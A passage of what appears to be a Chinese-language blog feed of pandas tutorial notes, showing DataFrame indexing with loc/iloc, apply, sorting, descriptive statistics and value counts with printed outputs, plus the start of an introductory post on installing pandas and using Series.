class="number">5</span>] = <span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">          one  two  three  four</span><br><span class="line">Ohio        <span class="number">0</span>    <span class="number">1</span>      <span class="number">2</span>     <span class="number">3</span></span><br><span class="line">Colorado    <span class="number">4</span>    <span class="number">5</span>      <span class="number">6</span>     <span class="number">7</span></span><br><span class="line">Utah        <span class="number">8</span>    <span class="number">9</span>     <span class="number">10</span>    <span class="number">11</span></span><br><span class="line">New York   <span class="number">12</span>   <span class="number">13</span>     <span class="number">14</span>    <span class="number">15</span></span><br><span class="line">Ohio         <span class="number">1</span></span><br><span class="line">Colorado     <span class="number">5</span></span><br><span class="line">Utah         <span class="number">9</span></span><br><span class="line">New York    <span class="number">13</span></span><br><span class="line">Name: two, dtype: int32</span><br><span class="line">          three  one</span><br><span class="line">Ohio          <span class="number">2</span>    <span class="number">0</span></span><br><span class="line">Colorado      <span class="number">6</span>    <span class="number">4</span></span><br><span class="line">Utah         <span class="number">10</span>    <span class="number">8</span></span><br><span class="line">New York     <span class="number">14</span>   <span class="number">12</span></span><br><span class="line">          one  two  three  four</span><br><span class="line">Ohio        <span class="number">0</span>    <span class="number">1</span>      <span class="number">2</span>     <span class="number">3</span></span><br><span class="line">Colorado    <span class="number">4</span>    <span class="number">5</span>      <span class="number">6</span>     <span class="number">7</span></span><br><span class="line">          one  two  three  four</span><br><span class="line">Colorado    <span class="number">4</span>    <span class="number">5</span>      <span class="number">6</span>     <span class="number">7</span></span><br><span class="line">Utah        <span class="number">8</span>    <span class="number">9</span>     <span class="number">10</span>    <span class="number">11</span></span><br><span class="line">New York   <span class="number">12</span>   <span class="number">13</span>     <span class="number">14</span>    <span class="number">15</span></span><br><span class="line">          one  two  three  four</span><br><span class="line">Ohio        <span class="number">0</span>    <span class="number">0</span>      <span class="number">0</span>     <span class="number">0</span></span><br><span class="line">Colorado    <span class="number">0</span>    <span class="number">5</span>      <span class="number">6</span>     <span class="number">7</span></span><br><span class="line">Utah        <span class="number">8</span>    <span class="number">9</span>     <span class="number">10</span>    <span class="number">11</span></span><br><span class="line">New York   <span class="number">12</span>   <span class="number">13</span>     <span class="number">14</span>    <span class="number">15</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使⽤loc和iloc选择数据 允许你使⽤轴标签（loc）或整数标签（iloc） 以NumPy⻛格的语法从DataFrame中选出数组的⾏和列的⼦集</span></span><br><span class="line">data = pd.DataFrame(np.arange(<span class="number">16</span>).reshape((<span class="number">4</span>, <span class="number">4</span>)),</span><br><span class="line">                    index=[<span class="string">&#x27;Ohio&#x27;</span>, <span class="string">&#x27;Colorado&#x27;</span>, <span class="string">&#x27;Utah&#x27;</span>, <span class="string">&#x27;New York&#x27;</span>],</span><br><span class="line">                    columns=[<span class="string">&#x27;one&#x27;</span>, <span class="string">&#x27;two&#x27;</span>, <span class="string">&#x27;three&#x27;</span>, <span class="string">&#x27;four&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">new_data = data.loc[<span class="string">&#x27;Colorado&#x27;</span>, [<span class="string">&#x27;two&#x27;</span>, <span class="string">&#x27;three&#x27;</span>]]</span><br><span class="line"><span class="built_in">print</span>(new_data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">new_data2 = data.iloc[<span class="number">2</span>, [<span class="number">3</span>, <span class="number">0</span>, <span class="number">1</span>]]</span><br><span class="line"><span class="built_in">print</span>(new_data2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="comment"># 切⽚也是可以的</span></span><br><span class="line">new_data3 = data.loc[:<span class="string">&#x27;Utah&#x27;</span>, <span class="string">&#x27;two&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(new_data3)</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">          one  two  three  four</span><br><span class="line">Ohio        <span class="number">0</span>    <span class="number">1</span>      <span class="number">2</span>     <span class="number">3</span></span><br><span class="line">Colorado    <span class="number">4</span>    <span class="number">5</span>      <span class="number">6</span>     <span class="number">7</span></span><br><span class="line">Utah        <span class="number">8</span>    <span class="number">9</span>     <span class="number">10</span>    <span class="number">11</span></span><br><span class="line">New York   <span class="number">12</span>   <span class="number">13</span>     <span class="number">14</span>    <span class="number">15</span></span><br><span class="line">two      <span class="number">5</span></span><br><span class="line">three    <span class="number">6</span></span><br><span class="line">Name: Colorado, dtype: int32</span><br><span class="line">four    <span class="number">11</span></span><br><span class="line">one      <span class="number">8</span></span><br><span class="line">two      <span class="number">9</span></span><br><span class="line">Name: Utah, dtype: int32</span><br><span class="line">Ohio        <span class="number">1</span></span><br><span class="line">Colorado    <span class="number">5</span></span><br><span class="line">Utah        <span class="number">9</span></span><br><span class="line">Name: two, dtype: int32</span><br></pre></td></tr></table></figure><h1 id="总结DataFrame索引选项"><a href="#总结DataFrame索引选项" class="headerlink" title="总结DataFrame索引选项"></a>总结DataFrame索引选项</h1><ul><li><p>df[val] 选择列或列序列等 </p></li><li><p>df.loc[val] 选择行或多行</p></li><li><p>df.loc[:,val] 单列或多列</p></li><li><p>df.loc[val1,val2] 行、列的⼀部分 </p></li><li><p>iloc就是把上⾯的换成整数数字</p></li></ul><h1 id="函数应用和映射"><a href="#函数应用和映射" class="headerlink" title="函数应用和映射"></a>函数应用和映射</h1><ul><li><p>NumPy的通用函数（逐元素数组⽅法）对pandas对象也有效</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">frame = pd.DataFrame(np.random.randn(<span class="number">4</span>, <span class="number">3</span>),</span><br><span class="line">                     columns=<span class="built_in">list</span>(<span class="string">&#x27;bde&#x27;</span>),</span><br><span class="line">                     index=[<span class="string">&#x27;Utah&#x27;</span>, <span class="string">&#x27;Ohio&#x27;</span>, <span class="string">&#x27;Texas&#x27;</span>, <span class="string">&#x27;Oregon&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(np.<span class="built_in">abs</span>(frame))</span><br></pre></td></tr></table></figure></li><li><p><code>apply</code>默认将函数应用到一列的一维数组上。 如果你传递axis=’columnsʼ 给apply函数，函数将会被每行⼀次：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">frame = pd.DataFrame(np.random.randn(<span class="number">4</span>, <span class="number">3</span>),</span><br><span class="line">                     columns=<span class="built_in">list</span>(<span class="string">&#x27;bde&#x27;</span>),</span><br><span class="line">                     index=[<span class="string">&#x27;Utah&#x27;</span>, <span class="string">&#x27;Ohio&#x27;</span>, <span class="string">&#x27;Texas&#x27;</span>, <span class="string">&#x27;Oregon&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(np.<span class="built_in">abs</span>(frame))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">f = <span class="keyword">lambda</span> x: x.<span class="built_in">max</span>() - x.<span class="built_in">min</span>()</span><br><span class="line"><span class="built_in">print</span>(frame.apply(f))</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">               b         d         e</span><br><span class="line">Utah    <span class="number">0.297036</span>  <span class="number">1.210924</span>  <span class="number">0.810702</span></span><br><span class="line">Ohio    <span class="number">0.730992</span>  <span class="number">0.579052</span>  <span class="number">0.513343</span></span><br><span class="line">Texas   <span class="number">1.104721</span>  <span class="number">1.476416</span>  <span class="number">2.247631</span></span><br><span class="line">Oregon  <span class="number">0.043827</span>  <span class="number">0.291884</span>  <span class="number">0.018255</span></span><br><span class="line"></span><br><span class="line">b    <span class="number">1.060894</span></span><br><span class="line">d    <span class="number">2.055468</span></span><br><span class="line">e    <span class="number">2.229375</span></span><br><span class="line">dtype: float64</span><br></pre></td></tr></table></figure></li><li><p>传递给apply的函数并不⼀定要返回⼀个标量值，也可以返回带有多个值的Series：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">frame = pd.DataFrame(np.random.randn(<span class="number">4</span>, <span class="number">3</span>),</span><br><span class="line">                     columns=<span class="built_in">list</span>(<span class="string">&#x27;bde&#x27;</span>),</span><br><span class="line">                     index=[<span class="string">&#x27;Utah&#x27;</span>, <span class="string">&#x27;Ohio&#x27;</span>, <span class="string">&#x27;Texas&#x27;</span>, <span class="string">&#x27;Oregon&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> pd.Series([x.<span class="built_in">min</span>(), x.<span class="built_in">max</span>()], index=[<span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;max&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(frame.apply(f))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">b         d         e</span><br><span class="line"><span class="built_in">min</span> -<span class="number">1.063232</span> -<span class="number">1.355637</span> -<span class="number">0.282985</span></span><br><span class="line"><span class="built_in">max</span>  <span class="number">1.423598</span>  <span class="number">1.756635</span>  <span class="number">0.451098</span></span><br></pre></td></tr></table></figure></li><li><p>applymap : 逐元素的Python函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">frame = pd.DataFrame(np.random.randn(<span class="number">4</span>, <span class="number">3</span>),</span><br><span class="line">                     columns=<span class="built_in">list</span>(<span class="string">&#x27;bde&#x27;</span>),</span><br><span class="line">                     index=[<span class="string">&#x27;Utah&#x27;</span>, <span class="string">&#x27;Ohio&#x27;</span>, <span class="string">&#x27;Texas&#x27;</span>, <span class="string">&#x27;Oregon&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">format</span> = <span class="keyword">lambda</span> x: x * <span class="number">100</span></span><br><span class="line"><span class="built_in">print</span>(frame.applymap(<span class="built_in">format</span>))</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">                b           d           e</span><br><span class="line">Utah   -<span class="number">28.122511</span>  -<span class="number">16.910430</span> -<span class="number">212.794452</span></span><br><span class="line">Ohio   -<span class="number">78.828099</span>  <span class="number">161.207172</span>  -<span class="number">59.498493</span></span><br><span class="line">Texas   <span class="number">21.657686</span>  <span class="number">140.176088</span>  -<span class="number">54.282543</span></span><br><span class="line">Oregon -<span class="number">40.679744</span>  <span class="number">119.859148</span>  -<span class="number">71.718273</span></span><br></pre></td></tr></table></figure></li></ul><h1 id="排序和排名"><a href="#排序和排名" class="headerlink" title="排序和排名"></a>排序和排名</h1><ul><li>如需按行或列索引进行字典型排序，需要使⽤sort_index方法，该方法返回⼀个新的、排序好的 对象</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">obj = pd.Series(<span class="built_in">range</span>(<span class="number">4</span>), index=[<span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(obj)</span><br><span class="line"><span class="built_in">print</span>(obj.sort_index())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">d    <span class="number">0</span></span><br><span class="line">a    <span class="number">1</span></span><br><span class="line">b    <span class="number">2</span></span><br><span class="line">c    <span class="number">3</span></span><br><span class="line">dtype: int64</span><br><span class="line">a    <span class="number">1</span></span><br><span class="line">b    <span class="number">2</span></span><br><span class="line">c    <span class="number">3</span></span><br><span class="line">d    <span class="number">0</span></span><br><span class="line">dtype: int64</span><br></pre></td></tr></table></figure><ul><li>在DataFrame中，你可以在各个轴上按索引排序：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">frame = pd.DataFrame(np.arange(<span class="number">8</span>).reshape((<span class="number">2</span>, <span class="number">4</span>)),</span><br><span class="line">                     index=[<span class="string">&#x27;three&#x27;</span>, <span class="string">&#x27;one&#x27;</span>],</span><br><span class="line">                     columns=[<span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(frame)</span><br><span class="line"><span class="built_in">print</span>(frame.sort_index())</span><br><span class="line"><span class="built_in">print</span>(frame.sort_index(axis=<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">       d  a  b  c</span><br><span class="line">three  <span class="number">0</span>  <span class="number">1</span>  <span class="number">2</span>  <span class="number">3</span></span><br><span class="line">one    <span class="number">4</span>  <span class="number">5</span>  <span class="number">6</span>  <span class="number">7</span></span><br><span class="line"></span><br><span class="line">       d  a  b  c</span><br><span class="line">one    <span class="number">4</span>  <span class="number">5</span>  <span class="number">6</span>  <span class="number">7</span></span><br><span class="line">three  <span class="number">0</span>  <span class="number">1</span>  <span class="number">2</span>  <span class="number">3</span></span><br><span class="line"></span><br><span class="line">       a  b  c  d</span><br><span class="line">three  <span class="number">1</span>  <span class="number">2</span>  <span class="number">3</span>  <span class="number">0</span></span><br><span class="line">one    <span class="number">5</span>  <span class="number">6</span>  <span class="number">7</span>  <span class="number">4</span></span><br></pre></td></tr></table></figure><ul><li>如果要根据Series的值进行排序，使⽤sort_values方法。</li><li>当对DataFrame排序时，你可以使⽤⼀列或多列作为排序键。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">frame = pd.DataFrame(np.arange(<span class="number">8</span>).reshape((<span class="number">2</span>, <span class="number">4</span>)),</span><br><span class="line">                     index=[<span class="string">&#x27;three&#x27;</span>, <span class="string">&#x27;one&#x27;</span>],</span><br><span class="line">                     columns=[<span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(frame.sort_values(by=<span class="string">&#x27;b&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(frame.sort_values(by=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">       d  a  b  c</span><br><span class="line">three  <span class="number">0</span>  <span class="number">1</span>  <span class="number">2</span>  <span class="number">3</span></span><br><span class="line">one    <span class="number">4</span>  <span class="number">5</span>  <span class="number">6</span>  <span class="number">7</span></span><br><span class="line">       d  a  b  c</span><br><span class="line">three  <span class="number">0</span>  <span class="number">1</span>  <span class="number">2</span>  <span class="number">3</span></span><br><span class="line">one    <span class="number">4</span>  <span class="number">5</span>  <span class="number">6</span>  <span class="number">7</span></span><br></pre></td></tr></table></figure><h1 id="描述性统计的概述和计算"><a href="#描述性统计的概述和计算" class="headerlink" title="描述性统计的概述和计算"></a>描述性统计的概述和计算</h1><ul><li><p>与NumPy数组中的类似⽅法相⽐，Series、DataFrame内建了处理缺失值的功能</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">df = pd.DataFrame([[<span class="number">1.4</span>, np.nan], [<span class="number">7.1</span>, -<span class="number">4.5</span>],[np.nan, np.nan], [<span class="number">0.75</span>, -<span class="number">1.3</span>]],</span><br><span class="line">                  index=[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>],</span><br><span class="line">                  columns=[<span class="string">&#x27;one&#x27;</span>, <span class="string">&#x27;two&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(df.<span class="built_in">sum</span>())</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">one    <span class="number">9.25</span></span><br><span class="line">two   -<span class="number">5.80</span></span><br><span class="line">dtype: float64</span><br></pre></td></tr></table></figure></li><li><p>除⾮整个切片上（在本例中是⾏或列）都是NA，否则NA值是被⾃动排除的。可以通过禁⽤ skipna来实现不排除NA值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 不跳过NA skipna=False</span></span><br><span class="line">df = pd.DataFrame([[<span class="number">1.4</span>, np.nan], [<span class="number">7.1</span>, -<span class="number">4.5</span>],[np.nan, np.nan], [<span class="number">0.75</span>, -<span class="number">1.3</span>]],</span><br><span class="line">                  index=[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>],</span><br><span class="line">                  columns=[<span class="string">&#x27;one&#x27;</span>, <span class="string">&#x27;two&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(df.<span class="built_in">sum</span>(axis=<span class="number">1</span>,skipna=<span class="literal">False</span>))</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">a     NaN</span><br><span class="line">b    <span class="number">2.60</span></span><br><span class="line">c     NaN</span><br><span class="line">d   -<span class="number">0.55</span></span><br><span class="line">dtype: float64</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#最⼩值或最⼤值的索引值：</span></span><br><span class="line"><span class="comment"># df.idxmax()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#describe产⽣汇总统计</span></span><br><span class="line"><span class="comment"># df.describe(）</span></span><br><span class="line">            </span><br><span class="line">df = pd.DataFrame([[<span class="number">1.4</span>, np.nan], [<span class="number">7.1</span>, -<span class="number">4.5</span>],[np.nan, np.nan], [<span class="number">0.75</span>, -<span class="number">1.3</span>]],</span><br><span class="line">                  index=[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>],</span><br><span class="line">                  columns=[<span class="string">&#x27;one&#x27;</span>, <span class="string">&#x27;two&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(df.describe())</span><br><span class="line"><span class="built_in">print</span>(df.idxmax(one))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">            one       two</span><br><span class="line">count  <span class="number">3.000000</span>  <span class="number">2.000000</span></span><br><span class="line">mean   <span class="number">3.083333</span> -<span class="number">2.900000</span></span><br><span class="line">std    <span class="number">3.493685</span>  <span class="number">2.262742</span></span><br><span class="line"><span class="built_in">min</span>    <span class="number">0.750000</span> -<span class="number">4.500000</span></span><br><span class="line"><span class="number">25</span>%    <span class="number">1.075000</span> -<span class="number">3.700000</span></span><br><span class="line"><span class="number">50</span>%    <span class="number">1.400000</span> -<span class="number">2.900000</span></span><br><span class="line"><span class="number">75</span>%    <span class="number">4.250000</span> -<span class="number">2.100000</span></span><br><span class="line"><span class="built_in">max</span>    <span class="number">7.100000</span> -<span class="number">1.300000</span></span><br><span class="line"></span><br><span class="line">one    b</span><br><span class="line">two    d</span><br><span class="line">dtype: <span class="built_in">object</span></span><br></pre></td></tr></table></figure><h1 id="唯一值"><a href="#唯一值" class="headerlink" title="唯一值"></a>唯一值</h1><ul><li><p>unique，它会给出Series中的唯⼀值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">obj = pd.Series([<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;c&#x27;</span>])</span><br><span class="line">uniques = obj.unique()</span><br><span class="line"><span class="built_in">print</span>(uniques)</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">[<span class="string">&#x27;c&#x27;</span> <span class="string">&#x27;a&#x27;</span> <span class="string">&#x27;d&#x27;</span> <span class="string">&#x27;b&#x27;</span>]</span><br></pre></td></tr></table></figure></li><li><p> value_counts计算Series包含的值的个数</p></li></ul>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">obj = pd.Series([<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;c&#x27;</span>])</span><br><span class="line">counts = obj.value_counts()</span><br><span class="line"><span class="built_in">print</span>(counts)</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">c    <span class="number">3</span></span><br><span class="line">a    <span class="number">3</span></span><br><span class="line">b    <span class="number">2</span></span><br><span class="line">d    <span class="number">1</span></span><br><span class="line">dtype: int64</span><br></pre></td></tr></table></figure><h1 id="数据载入、存储及文件格式"><a href="#数据载入、存储及文件格式" class="headerlink" title="数据载入、存储及文件格式"></a>数据载入、存储及文件格式</h1><ul><li><p>read_csv : 读取.csv格式</p></li><li><p>read_json : 读取json</p><p>将JSON字符串转换为Python形式时，使⽤json.loads⽅法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">score = pd.read_csv(<span class="string">&quot;1.csv&quot;</span>,encoding=<span class="string">&#x27;GBK&#x27;</span>,index_col=<span class="number">1</span>)  <span class="comment"># index_col=1</span></span><br><span class="line"><span class="built_in">print</span>(score)</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">      <span class="number">1</span></span><br><span class="line"><span class="number">2</span>      </span><br><span class="line">小白   张三</span><br><span class="line"> 小红  李四</span><br></pre></td></tr></table></figure><p>pandas.read_json可以⾃动将JSON数据集按照指定次序转换 为Series或DataFrame</p></li></ul><p>argmax - 函数</p><p>idmax - 索引</p>]]></content>
      
      
      <categories>
          
          <category> python数据分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pandas入门</title>
      <link href="/2022/09/29/Pandas%E5%85%A5%E9%97%A8/"/>
      <url>/2022/09/29/Pandas%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="安装Pandas"><a href="#安装Pandas" class="headerlink" title="安装Pandas"></a>安装Pandas</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pandas --target=D:\My_Code\class_python\venv\Lib\site-packages</span><br></pre></td></tr></table></figure><h1 id="Pandas数据结构"><a href="#Pandas数据结构" class="headerlink" title="Pandas数据结构"></a>Pandas数据结构</h1><ul><li>Series</li><li>DataFrame</li><li>索引对象</li></ul><h1 id="Series"><a href="#Series" class="headerlink" title="Series"></a>Series</h1><ol><li><p>Series是⼀种⼀维的数组型对象，它包含了⼀个值序列（与 NumPy中的类型相似），并且包含了 数据标签，称为索引 （index）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用Series</span></span><br><span class="line"></span><br><span class="line">obj = pd.Series([<span class="number">4</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">2</span>])</span><br><span class="line"><span class="built_in">print</span>(obj)</span><br><span class="line"></span><br><span class="line">// </span><br><span class="line"><span class="number">0</span>    <span class="number">4</span></span><br><span class="line"><span class="number">1</span>    <span class="number">7</span></span><br><span class="line"><span class="number">2</span>    <span class="number">1</span></span><br><span class="line"><span class="number">3</span>    <span class="number">2</span></span><br><span class="line">dtype: int64</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 使用Series 并使用index索引</span></span><br><span class="line"></span><br><span class="line">obj2 = pd.Series([<span class="number">4</span>, <span class="number">7</span>, -<span class="number">2</span>, <span class="number">3</span>], index=[<span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;c&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(obj2)</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">d    <span class="number">4</span></span><br><span class="line">b    <span class="number">7</span></span><br><span class="line">a   -<span class="number">2</span></span><br><span class="line">c    <span class="number">3</span></span><br><span class="line">dtype: int64</span><br></pre></td></tr></table></figure></li><li><p>从数据中选择数据的时候可以使⽤标签来进⾏索引</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用索引取值</span></span><br><span class="line">obj2 = pd.Series([<span class="number">4</span>, <span class="number">7</span>, -<span class="number">2</span>, <span class="number">3</span>], index=[<span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;c&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(obj2[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(obj2[<span class="string">&#x27;a&#x27;</span>])</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line"><span class="number">4</span></span><br><span class="line">-<span 